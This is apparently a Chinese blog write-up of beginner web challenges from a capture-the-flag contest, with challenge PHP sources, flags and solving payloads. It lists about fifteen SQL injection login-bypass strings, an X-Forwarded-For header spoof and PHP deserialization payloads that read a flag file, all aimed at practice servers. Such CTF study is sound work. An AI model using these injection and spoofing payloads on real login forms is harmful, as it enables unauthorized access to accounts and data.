---
title: Asuri_ctf WEB Write-up
date: 2020-10-12 16:58:25
updated: 
comments: false
tags: 
  - SQL注入
  - 反序列化
categories: 
  - Write-Up
permalink: 
---

by:gyy
<h2>[nuaactf2019]web签到</h2>
<h3>F12</h3>
题目地址：<a class="url" href="http://106.15.177.94:10001/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10001/</a>

f12直接看源码
<h3>最终</h3>
问题解决：nuaactf{we1cOme_to_NuaAcTF}

<hr />
<h2>神奇的php</h2>
<h3>代码审计</h3>
题目地址：<a class="url" href="http://106.15.177.94:10017/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10017/</a>

打开直接给源码
<pre><code class="language-php" lang="php"><?php
require('flag.php');//寮曞叆flag鍜宎bc鍙橀噺
foreach($_GET as $key => $value){
    $key=$value;
}
if($a==$abc)
{
    echo $flag;
}
show_source(__FILE__);
?>
</code></pre>
get直接收个a参数，a=abc就出flag，非常简单
<h3>最终</h3>
payload：./?a=abc

问题解决：Asuri{php_is_amazing}

<hr />
<h2>GET</h2>
<h3>怀疑asuri水题</h3>
题目地址：<a class="url" href="http://106.15.177.94:10019" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10019</a>

打开得源码
<pre><code class="language-php" lang="php">
<?php
include_once('flag.php');
//flag.php涓�$flag鍙橀噺
if (isset($_GET['ans'])) {
    if ($_GET['ans']==='hello_world') {
        echo $flag;
        echo '<br>';
    }
}
show_source(__FILE__);
?>

</code></pre>
不说了
<h3>最终</h3>
payload：./ans=hello_world

问题解决：Asuri{get_is_simple}

<hr />
<h2>管理员</h2>
<h3>sql注入</h3>
题目地址：<a class="url" href="http://106.15.177.94:10012/" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10012/</a>

打开提示登录管理员

尝试登录：<code>1' or 1=1 #</code>

直接登录成功了...

后来尝试，还有多种payload
<h3>最终</h3>
payload：
<pre><code>' or 0=0 #
' or 1=1 or ''='
x' or 1=1 or 'x'='y
a' or 'a' = 'a
anything' OR 'x'='x
'%20or%20''='
'%20or%20'x'='x
' or 0=0 #
' or 1 --'
' or 1=1 or ''='
hi' or 'a'='a
' or username like '%
' or 1=1 or ''='
' or ''='
x' or 1=1 or 'x'='y
</code></pre>
大同小异，都记录下来，日后学习

问题解决：Asuri{Web_1s_easy}

<hr />
<h2>管理员2</h2>
<h3>同上</h3>
一样，payload登录提示要从本地登录
加个<code>X-Forwarded-For: 127.0.0.1</code>即可
<h3>最终</h3>
问题解决：Asuri{1m_Adm1n}

<hr />
<h2>php序列化</h2>
<h3>序列化</h3>
<h4>告诉我靶场题目有问题???我淦</h4>
题目地址：<del><a class="url" href="http://106.15.177.94:10014" target="_blank" rel="noopener noreferrer">http://106.15.177.94:10014</a></del>
新地址：<a class="url" href="http://desperadoccy.club:39016" target="_blank" rel="noopener noreferrer">http://desperadoccy.club:39016</a>

有时间再写
<h3>最终</h3>
payload：
<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:{s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:0;s:10:%22max_length%22;i:5;}</code>
&&
<code>http://desperadoccy.club:39016/?exp=O:10:%22FileReader%22:4:{s:8:%22Filename%22;S:4:%22\66lag%22;s:5:%22start%22;i:6;s:10:%22max_length%22;i:13;}</code>

问题解决：Asuri{php_serial1ze}

<hr />
